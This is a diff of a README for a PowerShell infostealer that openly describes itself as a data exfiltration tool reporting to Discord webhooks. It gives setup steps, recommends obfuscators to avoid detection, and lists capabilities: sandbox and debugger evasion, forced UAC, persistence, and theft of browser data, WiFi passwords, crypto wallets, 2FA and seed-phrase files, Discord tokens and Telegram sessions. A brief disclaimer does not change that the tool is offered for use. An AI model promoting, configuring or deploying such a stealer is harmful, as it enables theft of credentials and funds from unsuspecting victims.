@@ -22,7 +22,6 @@
 This tool is made for data exfiltration. All information collected is sent using discord webhooks.
 
 # Usage
-
 - Create a Webhook on your [Discord Server](https://discord.com). I recommend creating a new server.
 - Replace YOUR_WEBHOOK_HERE in [line 6](https://github.com/Chainski/Powershell-Token-Grabber/blob/main/main.ps1#L6) with your webhook.
 
@@ -30,16 +29,24 @@ This tool is made for data exfiltration. All information collected is sent using
 Use [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation). \
 Or use [Somalifuscator](https://github.com/kdot227/somalifuscator) for .bat files 
 
-# Screenshot
-![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
+# Screenshots
+  ### Builder
+> ![GUI](https://i.postimg.cc/XYGShDPP/builder.png)
+
+
+ ### Webhook Data
+> ![screenshot](https://user-images.githubusercontent.com/96607632/236490140-201f4987-3569-4542-a769-41cf09574f2d.png)
 
 #  Features
 - [x] GUI Builder
 - [x] Force UAC
-- [x] Anti-VM
+- [x] Anti-Analysis (VMWare, VirtualBox, SandBoxie, Debugger, VirusTotal, Any.Run)
 - [x] Persistence via [Task Scheduler](https://learn.microsoft.com/en-us/windows/win32/taskschd/about-the-task-scheduler) 
 - [x] Extracts WiFi Passwords
-- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge etc.)
+- [x] File grabber (sensitive files: ```2fa, backupcodes, seedphrases, passwords, etc.```) 
+- [x] Crypto Wallets 
+   > Armory | Atomic | Bitcoin | Bytecoin | Coinomi | Dash | Electrum | Ethereum | Exodus | Jaxx | Litecoin | Monero | Zcash
+- [x] Extracts Browser Data (Brave, Chrome, Firefox, Microsoft Edge, Thunderbird etc.)
 - [x] Telegram Session Stealer that [Bypasses 2FA](https://www.microsoft.com/en-ww/security/business/security-101/what-is-two-factor-authentication-2fa)
 - [x] Extracts Discord Token
 - [x] Get System Information (Version, CPU, DISK, GPU, RAM, IP, Installed Apps etc.)
@@ -93,15 +100,9 @@ You bear the full responsibility of your actions and acknowledge that this tool 
 This tool's main purpose is NOT to be used maliciously, or on any system that you do not own, or have the right to use.
 By using this software, you automatically agree to the above.
 
-# Donate
-
-btc = bc1qm9g6l82mcsryfuzlvps29fmcfwx7244kuxxkay \
-ltc = ltc1qzywkdqyzj0x6p97mh3uhmwhl0v94fa5363nx3j \
-eth = 0x6be64aC1eC6616866323CdD094B8834066A95854
-
 # Credits
 - https://github.com/Purp1eW0lf
 - https://github.com/KDot227
 - https://github.com/Chainski
 
-
+<p align="center"><a href=#top>Back to Top</a></p>
